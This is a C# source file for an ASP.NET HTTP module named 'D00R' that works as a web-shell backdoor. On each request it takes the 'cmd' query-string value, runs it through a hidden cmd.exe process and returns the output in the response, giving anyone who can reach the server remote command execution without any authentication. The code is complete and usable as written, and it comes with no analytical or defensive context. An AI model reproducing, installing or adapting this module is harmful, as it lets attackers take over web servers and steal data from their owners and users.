using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Diagnostics;


namespace a
{
    public class D00R : IHttpModule
    {
        public void Dispose()
        {
        }

        public void Init(HttpApplication context)
        {
            context.PreRequestHandlerExecute += new EventHandler(Context_PreRequestHandlerExecute);
        }

        private void Context_PreRequestHandlerExecute(object sender, EventArgs e)
        {
            HttpApplication app = (HttpApplication)sender;
            HttpRequest request = app.Context.Request;
            HttpResponse response = app.Context.Response;
            try
            {
                string cmd = request.QueryString.Get("cmd");
                if (cmd != null) {
                    Process proc = new Process();
                    proc.StartInfo.CreateNoWindow = true;
                    proc.StartInfo.FileName = "cmd.exe";
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.RedirectStandardError = true;
                    proc.StartInfo.RedirectStandardInput = true;
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.Start();
                    proc.StandardInput.WriteLine(cmd);
                    proc.StandardInput.WriteLine("exit");
                    string outStr = proc.StandardOutput.ReadToEnd();
                    proc.Close();
                    response.Clear();
                    response.BufferOutput = true;
                    response.Write(outStr);
                    response.End();
                }
            }
            catch (Exception err)
            {
                response.Write(err.Message);
            }
        }
    }
}

